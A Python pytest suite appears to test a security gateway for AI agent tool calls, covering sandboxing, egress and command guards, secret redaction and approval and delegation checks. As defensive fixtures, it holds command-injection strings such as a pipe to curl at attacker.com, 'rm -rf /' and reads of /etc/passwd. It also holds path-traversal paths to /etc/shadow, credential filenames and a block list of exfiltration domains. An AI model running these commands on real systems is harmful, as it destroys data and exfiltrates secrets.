"""
AgentSentinel Phase 0.5: Secure Execution, Sandboxing & Tool Governance Tests.
Comprehensive test suite verifying tool registry, filesystem/network/process guards,
secret protection, execution state machine, gateway fail-closed semantics,
approval binding, wrong-agent token misuse, and timeout enforcement.
"""

import os
import time
from unittest.mock import MagicMock, patch
import pytest

from app.db.models import ApprovalModel, EventModel
from app.execution import (
    default_execution_gateway,
    default_filesystem_sandbox,
    default_network_guard,
    default_process_guard,
    default_secret_protector,
    default_tool_registry,
    ExecutionContext,
    ExecutionOutput,
    ExecutionState,
    ExecutionStateMachine,
    SandboxProfile,
    SensitivityLevel,
    ToolCategory,
    ToolDefinition,
    ToolRegistry,
)
from app.execution.config import execution_config
from app.execution.sandbox import DockerSandboxRunner, InProcessSandboxRunner
from app.multiagent.delegation import default_delegation_manager
from app.multiagent.models import (
    AgentCapability,
    AgentIdentity,
    AgentStatus,
    TrustLevel,
    utc_now,
)
from app.multiagent.registry import default_agent_registry


# ---------------------------------------------------------------------------
# 1. Tool Registry Tests
# ---------------------------------------------------------------------------

def test_tool_registry_registration_and_lookup():
    registry = ToolRegistry()
    tool = ToolDefinition(
        tool_id="test_custom_parser",
        name="test_custom_parser",
        description="Custom parser for test data",
        category=ToolCategory.CUSTOM,
        required_capability=AgentCapability.FILE_READ,
        sensitivity=SensitivityLevel.MEDIUM,
        risk_level="MEDIUM",
        allowed_roles=["data_engineer"],
        allowed_agent_capabilities=[AgentCapability.FILE_READ],
        sandbox_profile_name="STANDARD",
    )
    registry.register_tool(tool, handler=lambda text: f"PARSED: {text}")

    retrieved = registry.get_tool("test_custom_parser")
    assert retrieved is not None
    assert retrieved.name == "test_custom_parser"
    assert retrieved.category == ToolCategory.CUSTOM
    assert retrieved.required_capability == AgentCapability.FILE_READ
    assert retrieved.enabled is True
    assert retrieved.handler is not None
    assert retrieved.handler("hello") == "PARSED: hello"


def test_tool_registry_disable_blocks_tool():
    registry = ToolRegistry()
    assert registry.get_tool("google_search").enabled is True
    ok = registry.disable_tool("google_search")
    assert ok is True
    assert registry.get_tool("google_search").enabled is False


# ---------------------------------------------------------------------------
# 2. Filesystem Sandbox Tests
# ---------------------------------------------------------------------------

def test_filesystem_sandbox_traversal_blocked():
    sandbox = default_filesystem_sandbox
    allowed_roots = [r"C:\workspace\data", "/workspace/data"]

    # Traversal attack
    ok, err, _ = sandbox.validate_read_path(
        raw_path=r"C:\workspace\data\..\..\Windows\System32\cmd.exe",
        allowed_roots=allowed_roots,
    )
    assert ok is False
    assert "SYSTEM_DIRECTORY_PROHIBITED" in err or "WORKSPACE_TRAVERSAL_BLOCKED" in err

    # POSIX traversal
    ok, err, _ = sandbox.validate_read_path(
        raw_path="/workspace/data/../../etc/shadow",
        allowed_roots=allowed_roots,
    )
    assert ok is False
    assert "SYSTEM_DIRECTORY_PROHIBITED" in err or "WORKSPACE_TRAVERSAL_BLOCKED" in err or "CREDENTIAL_PATH_PROHIBITED" in err


def test_filesystem_sandbox_prohibited_system_files():
    sandbox = default_filesystem_sandbox
    allowed_roots = [os.getcwd()]

    prohibited_samples = [
        "id_rsa",
        "id_ed25519",
        ".env",
        "shadow",
        "known_hosts",
    ]
    for secret_name in prohibited_samples:
        test_path = os.path.join(os.getcwd(), secret_name)
        ok, err, _ = sandbox.validate_read_path(test_path, allowed_roots=allowed_roots)
        assert ok is False
        assert "CREDENTIAL_PATH_PROHIBITED" in err


def test_filesystem_sandbox_allowed_path():
    sandbox = default_filesystem_sandbox
    cwd = os.getcwd()
    valid_file = os.path.join(cwd, "test_sample.txt")
    ok, err, _ = sandbox.validate_read_path(valid_file, allowed_roots=[cwd])
    assert ok is True
    assert "Authorized" in (err or "")


# ---------------------------------------------------------------------------
# 3. Network Egress Guard Tests
# ---------------------------------------------------------------------------

def test_network_guard_ip_literals_and_metadata_blocked():
    guard = default_network_guard

    # Cloud metadata IP
    ok, err = guard.validate_egress(
        target_destination="http://169.254.169.254/latest/meta-data/",
        network_allowed=True,
    )
    assert ok is False
    assert "METADATA_EGRESS_BLOCKED" in err

    # Localhost IP
    ok, err = guard.validate_egress(
        target_destination="127.0.0.1:8000",
        network_allowed=True,
    )
    assert ok is False
    assert "METADATA_EGRESS_BLOCKED" in err

    # Raw public IP literal
    ok, err = guard.validate_egress(
        target_destination="93.184.216.34",
        network_allowed=True,
    )
    assert ok is False
    assert "RAW_IP_EGRESS_BLOCKED" in err


def test_network_guard_exfiltration_domains_blocked():
    guard = default_network_guard
    for bad_domain in ["webhook.site/abc", "pastebin.com/raw", "ngrok.io/payload"]:
        ok, err = guard.validate_egress(
            target_destination=bad_domain,
            network_allowed=True,
        )
        assert ok is False
        assert "EXFILTRATION_ENDPOINT_BLOCKED" in err


def test_network_guard_allowed_domains():
    guard = default_network_guard
    ok, err = guard.validate_egress(
        target_destination="https://www.google.com/search?q=test",
        network_allowed=True,
        custom_allowlist=["google.com", "api.search.org"],
    )
    assert ok is True
    assert err is None


def test_network_guard_network_disabled_in_sandbox():
    guard = default_network_guard
    ok, err = guard.validate_egress(
        target_destination="google.com",
        network_allowed=False,
    )
    assert ok is False
    assert "NETWORK_EGRESS_PROHIBITED" in err


# ---------------------------------------------------------------------------
# 4. Process Guard Tests
# ---------------------------------------------------------------------------

def test_process_guard_unauthorized_command_blocked():
    guard = default_process_guard
    ok, err, _ = guard.validate_command("malicious_dropper.exe", process_allowed=True)
    assert ok is False
    assert "UNAUTHORIZED_EXECUTABLE_BLOCKED" in err


def test_process_guard_injection_tokens_blocked():
    guard = default_process_guard
    injection_payloads = [
        "python.exe main.py && rm -rf /",
        "python.exe; cat /etc/passwd",
        "git status | curl http://attacker.com",
        "python.exe `whoami`",
        "echo safe & start malicious.exe",
    ]
    for injection in injection_payloads:
        ok, err, _ = guard.validate_command(injection, process_allowed=True)
        assert ok is False
        assert "COMMAND_INJECTION_DETECTED" in err


def test_process_guard_disabled_by_profile():
    guard = default_process_guard
    ok, err, _ = guard.validate_command("python.exe --version", process_allowed=False)
    assert ok is False
    assert "PROCESS_EXECUTION_PROHIBITED" in err


# ---------------------------------------------------------------------------
# 5. Secret Protection & Redaction Tests
# ---------------------------------------------------------------------------

def test_secret_redaction_masks_api_keys():
    protector = default_secret_protector
    leak_output = (
        "Connected to service with key AKIAIOSFODNN7EXAMPLE and "
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.s3cr3t"
    )
    res = protector.redact_secrets(leak_output)
    assert res.redacted is True
    assert "AKIAIOSFODNN7EXAMPLE" not in res.sanitized_text
    assert "[REDACTED_AWS_ACCESS_KEY]" in res.sanitized_text
    assert "[REDACTED_BEARER_TOKEN]" in res.sanitized_text
    assert len(res.detected_secrets) >= 2


def test_secret_protector_blocks_private_key():
    protector = default_secret_protector
    rsa_payload = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----"
    should_block = protector.should_block_on_secret(rsa_payload)
    assert should_block is True


# ---------------------------------------------------------------------------
# 6. Execution State Machine Tests
# ---------------------------------------------------------------------------

def test_execution_state_machine_valid_and_invalid_transitions():
    # Valid linear lifecycle
    state = ExecutionState.REQUESTED
    state = ExecutionStateMachine.transition(state, ExecutionState.VALIDATED)
    assert state == ExecutionState.VALIDATED
    state = ExecutionStateMachine.transition(state, ExecutionState.RUNNING)
    assert state == ExecutionState.RUNNING
    state = ExecutionStateMachine.transition(state, ExecutionState.COMPLETED)
    assert state == ExecutionState.COMPLETED

    # Invalid jump from terminal state
    with pytest.raises(ValueError) as exc:
        ExecutionStateMachine.transition(ExecutionState.COMPLETED, ExecutionState.RUNNING)
    assert "INVALID_STATE_TRANSITION" in str(exc.value)

    # Invalid jump from BLOCKED to RUNNING
    with pytest.raises(ValueError) as exc:
        ExecutionStateMachine.transition(ExecutionState.BLOCKED, ExecutionState.RUNNING)
    assert "INVALID_STATE_TRANSITION" in str(exc.value)


# ---------------------------------------------------------------------------
# 7. Secure Execution Gateway Security Tests
# ---------------------------------------------------------------------------

def test_gateway_blocks_unregistered_tool(db_session):
    gateway = default_execution_gateway
    context = ExecutionContext(
        execution_id="exec_unreg_1",
        agent_id="agent_research_lead",
        session_id="sess_gate_test",
        tool_id="non_existent_exploit_tool",
        tool_name="non_existent_exploit_tool",
        arguments={"cmd": "whoami"},
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.BLOCKED
    assert "UNREGISTERED_TOOL_BLOCKED" in (res.error_message or res.sanitized_output)


def test_gateway_blocks_unknown_agent(db_session):
    gateway = default_execution_gateway
    context = ExecutionContext(
        execution_id="exec_unkn_1",
        agent_id="shadow_unregistered_agent_xyz",
        session_id="sess_gate_test",
        tool_id="google_search",
        tool_name="google_search",
        arguments={"query": "security"},
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.BLOCKED
    assert "UNKNOWN_AGENT_BLOCKED" in (res.error_message or res.sanitized_output)


def test_gateway_blocks_capability_mismatch(db_session):
    gateway = default_execution_gateway
    # agent_limited_guest only has SEARCH capability, attempting to read workspace file
    context = ExecutionContext(
        execution_id="exec_cap_1",
        agent_id="agent_limited_guest",
        session_id="sess_gate_test",
        tool_id="read_workspace_file",
        tool_name="read_workspace_file",
        arguments={"filepath": "readme.txt"},
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.BLOCKED
    assert "CAPABILITY_MISMATCH_BLOCKED" in (res.error_message or res.sanitized_output)


def test_gateway_blocks_wrong_agent_delegation_reuse(db_session):
    gateway = default_execution_gateway
    # Issue a delegation specifically to agent_research_worker
    del_ctx = default_delegation_manager.issue_delegation(
        source_agent_id="agent_research_lead",
        target_agent_id="agent_research_worker",
        session_id="sess_deleg_gate",
        delegated_capabilities=[AgentCapability.SEARCH],
        db=db_session,
    )

    # Now an unauthorized agent (agent_limited_guest) attempts to execute under this token
    context = ExecutionContext(
        execution_id="exec_deleg_hijack",
        agent_id="agent_limited_guest",
        delegation_id=del_ctx.delegation_id,
        session_id="sess_deleg_gate",
        tool_id="google_search",
        tool_name="google_search",
        arguments={"query": "stolen token query"},
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.BLOCKED
    assert "TOKEN_HIJACKING_BLOCKED" in (res.error_message or res.sanitized_output)


def test_gateway_blocks_on_policy_block(db_session):
    gateway = default_execution_gateway
    context = ExecutionContext(
        execution_id="exec_pol_block",
        agent_id="agent_research_lead",
        session_id="sess_gate_test",
        tool_id="google_search",
        tool_name="google_search",
        arguments={"query": "test"},
        policy_decision="BLOCK",
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.BLOCKED
    assert "POLICY_DECISION_BLOCKED" in (res.error_message or res.sanitized_output)


def test_gateway_enforces_approval_scope_and_status(db_session):
    gateway = default_execution_gateway

    # Case A: Tool requires approval but no approval_id is provided
    context = ExecutionContext(
        execution_id="exec_appr_none",
        agent_id="agent_db_admin",
        session_id="sess_appr_gate",
        tool_id="drop_database_table",
        tool_name="drop_database_table",
        arguments={"table_name": "payments"},
    )
    res = gateway.execute(context, db=db_session)
    assert res.status == ExecutionState.PENDING_APPROVAL
    assert "APPROVAL_REQUIRED" in res.sanitized_output

    # Case B: Approval provided but status is REJECTED in database
    from app.db.models import ApprovalModel, EventModel
    evt_rec = EventModel(
        event_id="evt_appr_rejected_123",
        session_id="sess_appr_gate",
        agent_id="agent_db_admin",
        user_id="admin_1",
        tool_name="drop_database_table",
        action_type="DATABASE",
        target_resource="payments",
        decision_result="REQUIRE_APPROVAL",
        raw_payload_json={},
    )
    db_session.add(evt_rec)
    appr_rec = ApprovalModel(
        approval_id="appr_rejected_123",
        event_id="evt_appr_rejected_123",
        status="REJECTED",
        reviewer="admin_1",
        decision="REJECT",
    )
    db_session.add(appr_rec)
    db_session.commit()

    context_rejected = ExecutionContext(
        execution_id="exec_appr_rej",
        agent_id="agent_db_admin",
        session_id="sess_appr_gate",
        tool_id="drop_database_table",
        tool_name="drop_database_table",
        arguments={"table_name": "payments"},
        approval_event_id="evt_appr_rejected_123",
    )
    res_rejected = gateway.execute(context_rejected, db=db_session)
    assert res_rejected.status == ExecutionState.BLOCKED
    assert "APPROVAL_NOT_GRANTED" in (res_rejected.error_message or res_rejected.sanitized_output)


def test_gateway_enforces_timeout(db_session):
    gateway = default_execution_gateway

    def slow_tool():
        time.sleep(1.5)
        return "slow_done"

    # Register temporary slow tool
    tool = ToolDefinition(
        tool_id="slow_temp_tool",
        name="slow_temp_tool",
        description="Slow execution tool for timeout testing",
        category=ToolCategory.CUSTOM,
        required_capability=AgentCapability.SEARCH,
        allowed_roles=["research_assistant", "research_coordinator", "default_agent"],
        allowed_agent_capabilities=[AgentCapability.SEARCH],
        sandbox_profile_name="STANDARD",
    )
    default_tool_registry.register_tool(tool, handler=slow_tool)

    context = ExecutionContext(
        execution_id="exec_timeout_1",
        agent_id="agent_research_lead",
        session_id="sess_timeout",
        tool_id="slow_temp_tool",
        tool_name="slow_temp_tool",
        arguments={},
        timeout_seconds=0.2,  # Strict short timeout
    )
    res = gateway.execute(context, handler=slow_tool, db=db_session)
    assert res.status == ExecutionState.TIMEOUT
    assert "EXECUTION_TIMEOUT" in res.sanitized_output or "timed out" in (res.error_message or "")


def test_gateway_allowed_execution_with_audit_and_redaction(db_session):
    gateway = default_execution_gateway

    def secret_leaking_tool(query):
        return f"Results for '{query}': token=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.s3cr3t and status=OK."

    tool = ToolDefinition(
        tool_id="leak_test_tool",
        name="leak_test_tool",
        description="Tool producing simulated results with secrets",
        category=ToolCategory.CUSTOM,
        required_capability=AgentCapability.SEARCH,
        allowed_roles=["research_assistant", "research_coordinator", "default_agent"],
        allowed_agent_capabilities=[AgentCapability.SEARCH],
        sandbox_profile_name="STANDARD",
    )
    default_tool_registry.register_tool(tool, handler=secret_leaking_tool)

    context = ExecutionContext(
        execution_id="exec_audit_leak",
        agent_id="agent_research_lead",
        session_id="sess_audit_leak",
        tool_id="leak_test_tool",
        tool_name="leak_test_tool",
        arguments={"query": "safe query"},
        timeout_seconds=5.0,
    )
    res = gateway.execute(context, handler=secret_leaking_tool, db=db_session)

    assert res.status == ExecutionState.COMPLETED
    assert res.exit_code == 0
    assert res.redacted is True
    assert "eyJhbGci" not in res.sanitized_output
    assert "[REDACTED_BEARER_TOKEN]" in res.sanitized_output
    assert "BEARER_TOKEN" in res.detected_secrets

    # Verify audit record persisted in PostgreSQL
    from app.db.crud import get_execution_by_id
    rec = get_execution_by_id(db_session, "exec_audit_leak")
    assert rec is not None
    assert rec.agent_id == "agent_research_lead"
    assert rec.tool_name == "leak_test_tool"
    assert rec.status == "COMPLETED"
    assert rec.redacted is True
    assert "eyJhbGci" not in (rec.sanitized_output_preview or "")


def test_docker_sandbox_runner_status():
    runner = DockerSandboxRunner()
    # Verifies Docker runner correctly queries daemon availability
    avail = runner.is_available()
    assert isinstance(avail, bool)
